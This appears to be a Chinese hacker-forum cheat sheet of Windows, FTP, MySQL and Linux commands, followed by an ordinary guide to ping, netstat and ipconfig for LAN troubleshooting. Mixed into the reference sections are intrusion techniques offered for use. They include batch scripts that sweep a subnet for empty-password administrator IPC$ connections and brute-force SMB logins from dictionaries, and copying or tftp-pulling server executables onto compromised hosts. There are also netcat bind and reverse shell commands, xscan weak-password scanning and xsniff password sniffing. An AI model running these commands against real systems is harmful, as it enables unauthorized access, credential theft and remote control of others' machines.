ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参 
数"/all"显示全部配置信息 
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A- 
H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如"DEL/AR *.*"表示删除当前目录下所有只读文件，"DEL/A- 
S *.*"表示删除当前目录下除系统文件以外的所有文件 
二： 
del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统 
确认就直接删除。（二个命令作用相同） 
move 盘符路径要移动的文件名 存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命 
令 
at id号 开启已注册的某个计划任务 
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 
at id号 /delete 停止某个已注册的计划任务 
at 查看所有的计划任务 
at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 
finger username @host 查看最近有哪些用户登陆 
telnet ip 端口 远和登陆服务器,默认端口为23 
open ip 连接到IP（属telnet登陆后的命令） 
telnet 在本机上直接键入telnet 将进入本机的telnet 
copy 路径文件名1 路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 
copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下 
cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注： 
2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 
copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文 
件）至本地C： 
xcopy 要复制的文件或目录树 目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 
tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将"IP"的 
server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式 
（传送文本文件模式）进行传送 
tftp -i 对方IP put c:server.exe 登陆后，上传本地c:server.exe至主机 
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文 
本文件时) 
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway 
addres，接口地址Interface 
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 
start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 
mem 查看cpu使用情况 
attrib 文件名(目录名) 查看某文件（目录）的属性 
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某 
属性 
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 
date /t 、 time /t 使用此参数即"DATE/T"、"TIME/T"将只显示当前日期和时间，而不必输入新日期和时间 
set 指定环境变量名称=要指派给变量的字符 设置环境变量 
set 显示当前所有的环境变量 
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 
pause 暂停批处理程序，并显示出：请按任意键继续.... 
if 在批处理程序中执行条件处理（更多说明见if命令及变量） 
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如："：start"标签） 
call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） 
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 
echo 信息 在屏幕上显示出信息 
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 
findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello 
find 文件名 查找某文件 
title 标题名字 更改CMD窗口标题名字 
color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡 
绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 
prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky ) 
三： 
ver 在DOS窗口下显示版本信息 
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） 
format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS 
md 目录名 创建目录 
replace 源文件 要替换文件的目录 替换文件 
ren 原文件名 新文件名 重命名文件名 
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 
type 文件名 显示文本文件的内容 
more 文件名 逐屏显示输出文件 
doskey 要锁定的命令＝字符 
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey 
dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= 
taskmgr 调出任务管理器 
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 
tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe 
path 路径可执行文件的文件名 为可执行文件设置一个路径。 
cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? 
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； 
regedit /e 注册表文件名 导出注册表 
cacls 文件名 参数 显示或修改文件访问控制列表（ACL）--针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户 
名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更 
改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。 
cacls 文件名 查看文件的访问用户权限列表 
REM 文本内容 在批处理文件中添加注解 
netsh 查看或更改本地网络配置情况 

四： 


IIS服务命令： 
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） 
iisreset /start或stop 启动（停止）所有Internet服务 
iisreset /restart 停止然后重新启动所有Internet服务 
iisreset /status 显示所有Internet服务状态 
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将 
会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 
FTP 命令： (后面有详细说明内容) 
ftp的命令行格式为: 
ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 
－d 使用调试方式。 
－n 限制ftp的自动登录,即不使用.netrc文件。 
－g 取消全局文件名。 
help [命令] 或 ？[命令] 查看命令说明 
bye 或 quit 终止主机FTP进程,并退出FTP管理方式. 
pwd 列出当前远端主机目录 
put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 
get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 
mget [remote-files] 从远端主机接收一批文件至本地主机 
mput local-files 将本地主机中一批文件传送至远端主机 
dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本 
地文件 
ascii 设定以ASCII方式传送文件(缺省值) 
bin 或 image 设定以二进制方式传送文件 
bell 每完成一次文件传送,报警提示 
cdup 返回上一级目录 
close 中断与远程服务器的ftp会话(与open对应) 
open host[port] 建立指定ftp服务器连接,可指定连接端口 
delete 删除远端主机中的文件 
mdelete [remote-files] 删除一批文件 
mkdir directory-name 在远端主机中建立目录 
rename [from] [to] 改变远端主机中的文件名 
rmdir directory-name 删除远端主机中的目录 
status 显示当前FTP的状态 
system 显示远端主机系统类型 
user user-name [password] [account] 重新以别的用户名登录远端主机 
open host [port] 重新建立一个新的连接 
prompt 交互提示模式 
macdef 定义宏命令 
lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 
chmod 改变远端主机的文件权限 
case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 
cd remote－dir 进入远程主机目录 
cdup 进入远程主机目录的父目录 
! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip 


#5 五： 


MYSQL 命令： 
mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 
（例：mysql -h110.110.110.110 -Uroot -P123456 
注:u与root可以不用加空格，其它也一样） 
exit 退出MYSQL 
mysqladmin -u用户名 -p旧密码 password 新密码 修改密码 
grant select on 数据库.* to 用户名@登录主机 identified by "密码"; 增加新用户。（注意：和上面不同，下 
面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） 
show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我 
们改密码和新增用户，实际上就是用这个库进行操作。 
use mysql； 
show tables; 显示库中的数据表 
describe 表名; 显示数据表的结构 
create database 库名; 建库 
use 库名； 
create table 表名 (字段设定列表)； 建表 
drop database 库名; 
drop table 表名； 删库和删表 
delete from 表名; 将表中记录清空 
select * from 表名; 显示表中的记录 
mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的mysql in目录下执行）;注释:将数据库 
school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 
win2003系统下新增命令（实用部份）： 
shutdown /参数 关闭或重启本地或远程主机。 
参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主 
机。 
例：shutdown /r /t 0 立即重启本地主机（无延时） 
taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 
参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终 
止指定的进程及他所启动的子进程。 
tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 
参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 
六： 
Linux系统下基本命令： 要区分大小写 
uname 显示版本信息（同win2K的 ver） 
dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） 
pwd 查询当前所在的目录位置 
cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。 
cat 文件名 查看文件内容 
cat >abc.txt 往abc.txt文件中写上内容。 
more 文件名 以一页一页的方式显示一个文本文件。 
cp 复制文件 
mv 移动文件 
rm 文件名 删除文件，rm -a 目录名删除目录及子目录 
mkdir 目录名 建立目录 
rmdir 删除子目录，目录内没有文档。 
chmod 设定档案或目录的存取权限 
grep 在档案中查找字符串 
diff 档案文件比较 
find 档案搜寻 
date 现在的日期、时间 
who 查询目前和你使用同一台机器的人以及Login时间地点 
w 查询目前上机者的详细资料 
whoami 查看自己的帐号名称 
groups 查看某人的Group 
passwd 更改密码 
history 查看自己下过的命令 
ps 显示进程状态 
kill 停止某进程 
gcc 黑客通常用它来编译C语言写的文件 
su 权限转换为指定使用者 
telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 
ftp ftp连接上某服务器（同win2K） 


附：批处理命令与变量 


1：for命令及变量 基本格式： 
FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定 
一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 
批处理每次能处理的变量从%0-%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2-%9指输入的 
第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 


(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ "(1 1 
254)"第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；"(1 -1 254)"说明：即从254到 
1 } 


command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开 
command_parameters：为特定命令指定参数或命令行开关 


IN (set)：指在(set)中取值；DO command ：指执行command 


参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如 
(d:pass.txt)时 }。 
用法举例： 
@echo off 
echo 用法格式：test.bat *.*.* > test.txt 


for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \%1.%%G / 
user:administrator | find "命令成功完成" >>test.txt 
存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存 
在test.txt中。 


/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来 
隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的 
IP地址；(1 1 254) 指起始值，增长量，结止值。 
@echo off 
echo 用法格式：ok.bat ip 
FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200 
存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为 
用户名；%1为输入的IP地址（默认）。 
七： 
2：if命令及变量 基本格式： 
IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为"真"。 
例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行 
最后返回的值不等于1，就执行后面的命令。 
0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 
IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。 
例："if "%2%"=="4" goto start"指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" 
"） 
IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。 
例："if not nc.exe goto end"指：如果没有发现nc.exe文件就跳到":end"标签处。 
IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令 
语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else 
后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才 
能执行，用上< >后就等于是单独一行了；例如："if exist test.txt. <del test.txt.> else echo 
test.txt.missing "，注意命令中的"." 


（二）系统外部命令(均需下载相关工具)： 


1、瑞士军刀：nc.exe 


参数说明： 
-h 查看帮助信息 
-d 后台模式 
-e prog程序重定向，一但连接就执行〔危险〕 
-i secs延时的间隔 
-l 监听模式，用于入站连接 
-L 监听模式，连接天闭后仍然继续监听，直到CTR+C 
-n IP地址，不能用域名 
-o film记录16进制的传输 
-p[空格]端口 本地端口号 
-r 随机本地及远程端口 
-t 使用Telnet交互方式 
-u UDP模式 
-v 详细输出，用-vv将更详细 
-w数字 timeout延时间隔 
-z 将输入，输出关掉（用于扫锚时） 
基本用法： 
nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 
nc -l -p 80 开启本机的TCP 80端口并监听 
nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 
nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的 
TCP 5354端口 
nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向 
连接192.168.0.2的5354端口 
高级用法： 
nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 
nc -L -p 80 > c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt 
nc -L -p 80 < c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把 
c:honeyport.txt中内容送入管道中，亦可起到传送文件作用 
type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把 
c:honeyport.txt中内容送入管道中,亦可起到传送文件作用 
本机上用：nc -l -p 本机端口 
在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K 
nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 
本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称 
在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机 
备 注： 
| 管道命令 
< 或 > 重定向命令。"<"，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令 
＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:winnt >> d:log.txt 意思是：后台执行dir，并把结果 
存在d:log.txt中 


>与>>的区别 ">"指：覆盖；">>"指：保存到(添加到）。 


如：@dir c:winnt >> d:log.txt和@dir c:winnt > d:log.txt二个命令分别执行二次比较看：用>>的则 
是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。 

八： 


2、扫锚工具：xscan.exe 


基本格式 
xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息 
xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息 
检测项目 
-active 检测主机是否存活 
-os 检测远程操作系统类型（通过NETBIOS和SNMP协议） 
-port 检测常用服务的端口状态 
-ftp 检测FTP弱口令 
-pub 检测FTP服务匿名用户写权限 
-pop3 检测POP3-Server弱口令 
-smtp 检测SMTP-Server漏洞 
-sql 检测SQL-Server弱口令 
-smb 检测NT-Server弱口令 
-iis 检测IIS编码/解码漏洞 
-cgi 检测CGI漏洞 
-nasl 加载Nessus攻击脚本 
-all 检测以上所有项目 
其它选项 
-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取 
-l 显示所有网络适配器 
-v 显示详细扫描进度 
-p 跳过没有响应的主机 
-o 跳过没有检测到开放端口的主机 
-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 
-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件) 
用法示例 
xscan -host 192.168.1.1-192.168.255.255 -all -active -p 检测 
192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机 
xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测 
192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端 
口的主机 
xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测"hostlist.txt"文件中列 
出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机 


九： 


3、命令行方式嗅探器: xsniff.exe 
可捕获局域网内FTP/SMTP/POP3/HTTP协议密码 
参数说明 
-tcp 输出TCP数据报 
-udp 输出UDP数据报 
-icmp 输出ICMP数据报 
-pass 过滤密码信息 
-hide 后台运行 
-host 解析主机名 
-addr IP地址 过滤IP地址 
-port 端口 过滤端口 
-log 文件名 将输出保存到文件 
-asc 以ASCII形式输出 
-hex 以16进制形式输出 
用法示例 
xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中 
xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以 
ASCII格式输出 


4、终端服务密码破解: tscrack.exe 


参数说明 
-h 显示使用帮助

http://groups.google.com/group/mise5
 


局域网常用的DOS网络命令 

 
一、Ping命令的使用技巧 

　　Ping是个使用频率极高的实用程序，用于确定本地主机是否能与另一台主机交换（发送与接收）数据报。根据返回的信息，我们就可以推断TCP/IP参数是否设置得正确以及运行是否正常。需要注意的是：成功地与另一台主机进行一次或两次数 据报交换并不表示TCP/IP配置就是正确的，我们必须执行大量的本地主机与远程主机的数据报交换，才能确信TCP/IP的正确性。 

　　简单的说，Ping就是一个测试程序，如果Ping运行正确，我们大体上就可以排除网络访问层、网卡、MODEM的输入输出线路、电缆和路由器等存在的故障，从而减小了问题的范围。但由于可以自定义所发数据报的大小及无休止的高速发送，Ping也被某些别有用心的人作为DDOS（拒绝服务攻击）的工具，例如许多大型的网站就是被黑客利用数百台可以高速接入互联网的电脑连续发送大量Ping数据报而瘫痪的。 

　　按照缺省设置，Windows上运行的Ping命令发送4个ICMP（网间控制报文协议）回送请求，每个32字节数据，如果一切正常，我们应能得到4个回送应答。 Ping能够以毫秒为单位显示发送回送请求到返回回送应答之间的时间量。如果应答时间短，表示数据报不必通过太多的路由器或网络连接速度比较快。Ping还能显示TTL（Time To Live存在时间）值，我们可以通过TTL值推算一下数据包已经通过了多少个路由器：源地点TTL起始值（就是比返回TTL略大的一个2的乘方数）-返回时TTL值。例如，返回TTL值为119，那么可以推算数据报离开源地址的TTL起始值为128，而源地点到目标地点要通过9个路由器网段（128-119）；如果返回TTL值为246，TTL起始值就是256，源地点到目标地点要通过9个路由器网段。 

　　1、通过Ping检测网络故障的典型次序 

正常情况下，当我们使用Ping命令来查找问题所在或检验网络运行情况时，我们需要使用许多Ping命令，如果所有都运行正确，我们就可以相信基本的连通性和配置参数没有问题；如果某些Ping命令出现运行故障，它也可以指明到何处去查找问题。下面就给出一个典型的检测次序及对应的可能故障： 

　　·ping 127.0.0.1 

这个Ping命令被送到本地计算机的IP软件，该命令永不退出该计算机。如果没有做到这一点，就表示TCP/IP的安装或运行存在某些最基本的问题。 

　　·ping 本机IP 

　　这个命令被送到我们计算机所配置的IP地址，我们的计算机始终都应该对该Ping命令作出应答，如果没有，则表示本地配置或安装存在问题。出现此问题时，局域网用户请断开网络电缆，然后重新发送该命令。如果网线断开后本命令正确，则表示另一台计算机可能配置了相同的IP地址。 

　　·ping 局域网内其他IP 

这个命令应该离开我们的计算机，经过网卡及网络电缆到达其他计算机，再返回。收到回送应答表明本地网络中的网卡和载体运行正确。但如果收到0个回送应答，那么表示子网掩码（进行子网分割时，将IP地址的网络部分与主机部分分开的代码）不正确或网卡配置错误或电缆系统有问题。 
·ping 网关IP 

　　这个命令如果应答正确，表示局域网中的网关路由器正在运行并能够作出应答。 

　　·ping 远程IP 

如果收到4个应答，表示成功的使用了缺省网关。对于拨号上网用户则表示能够成功的访问Internet（但不排除ISP的DNS会有问题）。 

　　·ping localhost 
localhost是个作系统的网络保留名，它是127.0.0.1的别名，每太计算机都应该能够将该名字转换成该地址。如果没有做到这一带内，则表示主机文件（/Windows/host）中存在问题。 

　　·ping www.xxx.com 
对这个域名执行Ping www.xxx.com 地址，通常是通过DNS 服务器 如果这里出现故障，则表示DNS服务器的IP地址配置不正确或DNS服务器有故障（对于拨号上网用户，某些ISP已经不需要设置DNS服务器了）。顺便说一句：我们也可以利用该命令实现域名对IP地址的转换功能。如果上面所列出的所有Ping命令都能正常运行，那么我们对自己的计算机进行本地和远程通信的功能基本上就可以放心了。但是，这些命令的成功并不表示我们所有的网络配置都没有问题，例如，某些子网掩码错误就可能无法用这些方法检测到。 

　　2、Ping命令的常用参数选项 

　　·ping IP Ct 

连续对IP地址执行Ping命令，直到被用户以Ctrl+C中断。 

　　·ping IP -l 3000 

指定Ping命令中的数据长度为3000字节，而不是缺省的32字节。 

　　·ping IP Cn 

执行特定次数的Ping命令。 

　　二、Netstat 命令的使用技巧 

　　Netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。如果我们的计算机有时候接受到的数据报会导致出错数据删除或故障，我们不必感到奇怪，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么我们就应该使用Netstat查一查为什么会出现这些情况了。 

　1、netstat 的一些常用选项 

　　·netstat Cs 

　　本选项能够按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。 

　　·netstat Ce 

　　本选项用于显示关于以太网的统计数据。它列出的项目包括传送的数据报的总字节数、错误数、删除数、数据报的数量和广播的数量。这些统计数据既有发送的数据报数量，也有接收的数据报数量。这个选项可以用来统计一些基本的网络流量）。 

　　·netstat Cr 

　　本选项可以显示关于路由表的信息，类似于后面所讲使用route print命令时看到的 信息。除了显示有效路由外，还显示当前有效的连接。 

　　·netstat Ca 

　　本选项显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请求（LISTENING）的那些连接。 

　　·netstat Cn 

　　显示所有已建立的有效连接。 

下面是 netstat 的输出示例： 

　　C:\>netstat -e 
　　Interface Statistics 
　　Received　　　Sent 
　　Bytes　　　　　　　　　3995837940　　47224622 
　　Unicast packets　　　　120099　　　　131015 
　　Non-unicast packets　　7579544　　　 3823 
　　Discards　　　　　　　 0　　　　　　 0 
　　Errors　　　　　　　　 0　　　　　　 0 
　　Unknown protocols　　　363054211 
　C:\>netstat -a 
　　Active Connections 
　　Proto Local Address　　　Foreign Address　　　 State 
　　TCP　CORP1:1572　　　 172.16.48.10:nbsession　 ESTABLISHED 
　　TCP　CORP1:1589　　　 172.16.48.10:nbsession　 ESTABLISHED 
　　TCP　CORP1:1606　　　 172.16.105.245:nbsession ESTABLISHED 
　　TCP　CORP1:1632　　　 172.16.48.213:nbsession　ESTABLISHED 
　　TCP　CORP1:1659　　　 172.16.48.169:nbsession　ESTABLISHED 
　　TCP　CORP1:1714　　　 172.16.48.203:nbsession　ESTABLISHED 
　　TCP　CORP1:1719　　　 172.16.48.36:nbsession　 ESTABLISHED 
　　TCP　CORP1:1241　　　 172.16.48.101:nbsession　ESTABLISHED 
　　UDP　CORP1:1025　　　 *:* 
　　UDP　CORP1:snmp　　　 *:* 
　　UDP　CORP1:nbname　　 *:* 
　　UDP　CORP1:nbdatagram *:* 
　　UDP　CORP1:nbname　　 *:* 
　　UDP　CORP1:nbdatagram *:* 

　　C:\>netstat -s 
　　IP Statistics 
　　Packets Received　　　　　　 = 5378528 
　　Received Header Errors　　　 = 738854 
　　Received Address Errors　　　= 23150 
　　Datagrams Forwarded　　　　　= 0 
　　Unknown Protocols Received　 = 0 
　　Received Packets Discarded　 = 0 
　　Received Packets Delivered　 = 4616524 
　　Output Requests　　　　　　　= 132702 
　　Routing Discards　　　　　　 = 157 
　　Discarded Output Packets　　 = 0 
　　Output Packet No Route　　　 = 0 
　　Reassembly Required　　　　　= 0 
　　Reassembly Successful　　　　　　 = 0 
　　Reassembly Failures　　　　　　　 = 
　　Datagrams Successfully Fragmented = 0 
　　Datagrams Failing Fragmentation　 = 0 
　　Fragments Created　　　　　　　　 = 0 
ICMP Statistics 
　　Received　Sent 
　　Messages　　　　　　　　 693　　　 4 
　　Errors　　　　　　　　　 0　　　　 0 
　　Destination Unreachable　685　　　 0 
　　Time Exceeded　　　　　　0　　　　 0 
　　Parameter Problems　　　 0　　　　 0 
　　Source Quenches　　　　　0　　　　 0 
　　Redirects　　　　　　　　0　　　　 0 
　　Echoes　　　　　　　　　 4　　　　 0 
　　Echo Replies　　　　　　 0　　　　 4 
　　Timestamps　　　　　　　 0　　　　 0 
　　Timestamp Replies　　　　0　　　　 0 
　　Address Masks　　　　　　0　　　　 0 
　　Address Mask Replies　　 0　　　　 0 

　　TCP Statistics 
　　Active Opens　　　　　　　　 = 597 
　　Passive Opens　　　　　　　　= 135 
　　Failed Connection Attempts　 = 107 
　　Reset Connections　　　　　　= 91 
　　Current Connections　　　　　= 8 
　　Segments Received　　　　　　= 106770 
　　Segments Sent　　　　　　　　= 118431 
　　Segments Retransmitted　　　 = 461 

　　UDP Statistics 
　　Datagrams Received　 = 4157136 
　　No Ports　　　　　　 = 351928 
　　Receive　Errors　　　 = 2 
　　Datagrams Sent　　　 = 13809 

　　2、Netstat的妙用 
　　经常上网的人一般都使用ICQ的，不知道我们有没有被一些讨厌的人骚扰，想投诉却又不知从和下手？其实，我们只要知道对方的IP，就可以向他所属的ISP投诉了。但怎样才能通过ICQ知道对方的IP呢？如果对方在设置ICQ时选择了不显示IP地址，那我们是无法在信息栏中看到的。其实，我们只需要通过Netstat就可以很方便的做到这一点：当他通过ICQ或其他的工具与我们相连时（例如我们给他发一条ICQ信息或他给我们发一条信息），我们立刻在DOS 命令提示符下输入netstat -n或netstat -a就可以看到对方上网时所用的IP或ISP域名了，甚至连所用Port都完全暴露了。 

　　三、IPConfig命令的使用技巧 

　　IPConfig实用程序和它的等价图形用户界面----Windows 95/98中的WinIPCfg可用于显示当前的TCP/IP配置的设置值。这些信息一般用来检验人工配置的TCP/IP设置是否正确。但是，如果我们的计算机和所在的局域网使用了动态主机配置协议（DHCP），这个程序所显示的信息也许更加实用。这时，IPConfig可以让我们了解自己的计算机是否成功的租用到一个IP地址，如果租用到则可以了解它目前分配到的是什么地址。了解计算机当前的IP地址、子网掩码和缺省网关实际上是进行测试和故障分析的必要项目。 
　1、IPConfig最常用的选项 

　　·ipconfig 

当使用IPConfig时不带任何参数选项，那么它为每个已经配置了的接口显示IP地址、子网掩码和缺省网关值。 

